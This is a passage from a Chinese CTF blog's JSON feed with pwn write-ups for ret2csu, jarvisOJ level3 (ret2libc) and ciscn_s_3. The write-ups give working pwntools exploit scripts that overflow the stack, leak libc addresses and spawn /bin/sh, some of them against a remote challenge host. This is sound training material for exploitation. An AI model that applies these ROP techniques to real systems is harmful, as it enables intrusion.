data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>write<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>read<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bss_base<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>csu1<span class=\"token operator\">=</span><span class=\"token number\">0x000400606</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>csu2<span class=\"token operator\">=</span><span class=\"token number\">0x0004005F0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">,</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">136</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#加 8 个 a 是因为 csu1 里先执行 add rsp，8   ，意味着将栈变长了八字节，要填充才能到后面</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    payload<span class=\"token operator\">+=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">#56 是将 add rsp，8 以及之后的总共 7 行全覆盖掉 7*8，前面已经给 rdx,rsi,edi 赋值了，再改变也没有影响</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>    <span class=\"token comment\">#不能用 sendline，会出错</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>write_really<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write_really<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write_really<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>execve<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'execve'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>read<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>bss_base<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>bss_base<span class=\"token punctuation\">,</span>bss_base<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#bss_base 相当于是 execve 的地址，bss_base+8 是到了 execve 的参数 \"/bin/sh\\x00\"</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://img-blog.csdnimg.cn/c98c4ed447994c66ac1d2bfc64b9f3c0.png\" alt=\"\" /></p>\n<p>参考链接 ret2csu：<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9ESXFZdg==\">http://t.csdn.cn/DIqYv</span></p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/",
            "title": "buuctf.pwn",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<p>#buuctf<br />\n##[HarekazeCTF2019]baby_rop2</p>\n<p>##pwn2_sctf_2016<br />\n<img data-src=\"kerd.png\" alt=\"\" /></p>\n<p>##&lt;center&gt;<strong>31.<strong>jarvisOJ_level3(<strong>ret2libc</strong>)&lt;/center&gt;<br />\n####1. 下载源文后查看文件保护和位数<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjif1.md.png\" alt=\"\" /><br />\n ####2. 发现是 32 位程序，开启了 NX (栈不可执行)<br />\n####，利用 ida 反编译查看程序 C 语言代码<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjPYR.md.png\" alt=\"\" /><br />\n #### 发现有 vul 函数进入查看<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjCk9.png\" alt=\"\" /><br />\n ####3. 发现有 write 和 read 函数，其中 read 函数可以进行栈溢出，可以对此利用 \t注意:write (1, 输出地址，输出字节数)<br />\n 因为没有发现后门函数，所以利用</strong> write 泄露 libc 的地址来执行 system (/bin/sh)</strong><br />\n###exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tcontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tp<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28074</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\te<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\twrite_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tread_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tmain<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpayload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>read_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">#p.recvuntil(\"Input:\\n\")</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tread<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tlibc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>read<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tlibcbase<span class=\"token operator\">=</span>read<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libcbase<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tbinsh<span class=\"token operator\">=</span>libcbase<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tpayload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>#### 此题无法用 libcsearcher 远程库找到 libc</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "ctf"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "title": "ciscn_s_3（利用系统调用+ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h1 id=\"ciscn_s_3\"><a class=\"anchor\" href=\"#ciscn_s_3\">#</a> ciscn_s_3</h1>\n<h3 id=\"1下载附件后查看程序信息\"><a class=\"anchor\" href=\"#1下载附件后查看程序信息\">#</a> 1. 下载附件后查看程序信息</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sKKK.png\" alt=\"\" /></p>\n<p>可以看到是 64 位程序，并且开启了 NX</p>\n<h3 id=\"2利用ida反汇编\"><a class=\"anchor\" href=\"#2利用ida反汇编\">#</a> 2. 利用 ida 反汇编</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6s85d.md.png\" alt=\"\" /></p>\n<p>发现有个 vul 函数，进入查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sJPA.png\" alt=\"\" /></p>\n<p>发现是 sys_read 函数，并且可以通过 <strong>sys_read 溢出</strong>，查看汇编代码</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sY8I.png\" alt=\"\" /></p>\n<p>发现有 syscall，由此判断是系统调用，那么我们通过 <strong>控制寄存器</strong> 的方式来进行系统调用然后 getshell</p>\n<h3 id=\"3漏洞利用分析\"><a class=\"anchor\" href=\"#3漏洞利用分析\">#</a> 3. 漏洞利用分析</h3>\n<p>此处放上之前的文章：<a href=\"https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/\" title=\"Linux之系统调用\">https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</a></p>\n<p>上面链接里能看到 64 位系统的系统调用号，找到 execve 命令是 59（0x3b）</p>\n<pre><code class=\"language-C\">\nint execve(const char *filename, char *const argv[], char *const envp[]);\n\n//const char *filename 为要执行文件的地址\n\n//char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名\n\n//char *const envp[]：一般传递NULL，表示可变参数的结尾。\n\n</code></pre>\n<p>我们要执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)</code>  来 getshell</p>\n<h3 id=\"4控制寄存器\"><a class=\"anchor\" href=\"#4控制寄存器\">#</a> 4. 控制寄存器</h3>\n<p>将 0x3b 存入 rax 寄存器，64 位系统调用寄存器顺序依次为：rdi，rsi，rdx</p>\n<p>本想着通过 Ropgadgets 查找对应寄存器构造 rop 链</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sHR1.png\" alt=\"\" /></p>\n<p>但是发现无法控制 rax 寄存器与 rdx 寄存器，所以要使用其他方法</p>\n<p>查看汇编发现有个 gadgets 函数，但是不知道为什么在代码流程图里没有显示后面的部分</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sxde.png\" alt=\"\" /></p>\n<p>此处看到 0x3b 存入了 rax，正好是 execve 的系统调用号 (也可以在 ida 窗口中按 alt+t 查找 mov rax,3bh 指令，找到指令存储位置为 0x4004E2)</p>\n<p>接着需要控制相应的传参寄存器，rdi，rsi，rdx，rcx, r8, r9。因为可以溢出的字符很多，那么我们可以利用   <strong>csu_init（ret2csu）</strong>  这一段代码，因为 64 位程序需要该函数对 libc 进行初始化，一般的程序都会调用 libc 函数，所以 <strong>一定存在</strong> 这个函数，并且该函数先于 main 函数执行</p>\n<p>原理:<a href=\"https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu\" title=\"64位构造通用ROP\">https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu</a></p>\n<h4 id=\"5构造rop\"><a class=\"anchor\" href=\"#5构造rop\">#</a> 5. 构造 rop</h4>\n<p>通过 ida 可以找到 csu 段地址，下面为 gadgets1</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCbss.png\" alt=\"\" /></p>\n<p>当我们进入 gadgets1 时，执行了 add rsp ,8 所以要填充 8 个字符，后续的 rbx 要为 0 才能不跳转，rbp 为 1 使其与后续加 1 后的 rbx 相同，r12 不需要所以可以任意，r13，r14，r15 分别会在 gadgets2 控制 rdx，rsi，rdi，填入我们需要的值，具体值如下：</p>\n<ul>\n<li>rbx=0</li>\n<li>rbp=1</li>\n<li>r12=0</li>\n<li>r13=0  （对应 rdx=0）</li>\n<li>r14=0  （对应 rsi=0）</li>\n<li>r15=&quot;binsh&quot; 的地址  （对应 rdi=&quot;/bin/sh&quot;）</li>\n</ul>\n<p>此处执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)  </code>  execve( rdi , rsi , rdx )</p>\n<p>由此我们需要找到 &quot;/bin/sh&quot; 地址，由于程序内找不到 &quot;/bin/sh&quot; , 所以需要我们自己写入 &quot;/bin/sh&quot;</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCjoV.png\" alt=\"\" /></p>\n<p>由上面的图可以看到，sys_wrtie 会输出 0x30 个字符，而 buf 在栈上只有 0x10 的大小，后面紧接着的 0x10 为 ret 和初始的 rbp 所占空间，后面 8 个字符为栈上的某一地址， <strong>利用该地址减去与 &quot;/bin/sh&quot; 地址的偏移量</strong> 即可获得 &quot;/bin/sh&quot; 地址。（这里是因为开启了保护每次在栈上的地址不同，而偏移是不会变的）</p>\n<p><strong>查看方式 1</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcii9S.png\" alt=\"\" /></p>\n<p>由上面的图片可以看出输入的字符串的地址（这里因为溢出所以应该为 ddf0），而看到距离 rsp 为 0x20 的地方输出了我们调试的程序的名称，这个一般是保存在 avrg [0]，这个是栈上的地址</p>\n<p><strong>查看方式 2</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcFrGT.png\" alt=\"\" /></p>\n<p>首先为写入的 buf 地址，然后在 0x20 大小后为栈地址，原因入下图，因此通过 sys_write 即可泄露</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcAxxS.png\" alt=\"\" /></p>\n<p>由于开启了保护所以写入栈的位置是不固定的，但是可以通过当此运行时泄露的栈地址减去固定的偏移量即可得到写入的字符串地址</p>\n<h3 id=\"7字符串地址计算方法\"><a class=\"anchor\" href=\"#7字符串地址计算方法\">#</a> 7. 字符串地址计算方法:</h3>\n<p>通过上面的 0x7fffffffdf38-0x7fffffffddf0=0x148 , 在计算栈的偏移时是 0x148（不知道是不是因为计算错误），但是线上靶场的环境栈的偏移是 0x118。</p>\n<p>在本地可以利用 patchelf 切换 libc 版本</p>\n<pre><code>patchelf --set-interpreter ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./ciscn_s_3\n</code></pre>\n<p>有了偏移之后就可以通过偏移量来计算输入的字符串地址：</p>\n<p><strong>输入字符串地址 = 泄露的栈地址 - 0x118</strong></p>\n<p>至此就得到了 &quot;/bin/sh&quot; 地址</p>\n<h3 id=\"8构造exp\"><a class=\"anchor\" href=\"#8构造exp\">#</a> 8. 构造 exp</h3>\n<p>因为 &quot;/bin/sh&quot; 占 7 个字节，需要改成 &quot;/bin/sh\\x00&quot; 来用隔断符来满足 8 个字节进行对齐</p>\n<p>先执行 syscall 还是先到 gadgets:</p>\n<p>先 gadgets 最后返回到 syscall</p>\n<p>系统调用号与 syscall 之间的执行顺序：</p>\n<p>系统调用号执行后返回到 syscall，参数都在前面</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26711</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./ciscn_s_3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x04004ED</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>execve<span class=\"token operator\">=</span><span class=\"token number\">0x0004004E2</span> <span class=\"token comment\">#mov rax,3BH; ret;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>syscall<span class=\"token operator\">=</span><span class=\"token number\">0x000400501</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>gadgets1<span class=\"token operator\">=</span><span class=\"token number\">0x000040059a</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gadgets2<span class=\"token operator\">=</span><span class=\"token number\">0x0000400580</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x004005a3</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gadgets1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span> <span class=\"token comment\">#此处 r15 的值可有可无，因为后面仍然调用 rdi_ret 来传参</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    payload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>gadgets2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 此处之间填充到 ret，没有考虑 rbp，gdb 中调试就可以发现</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 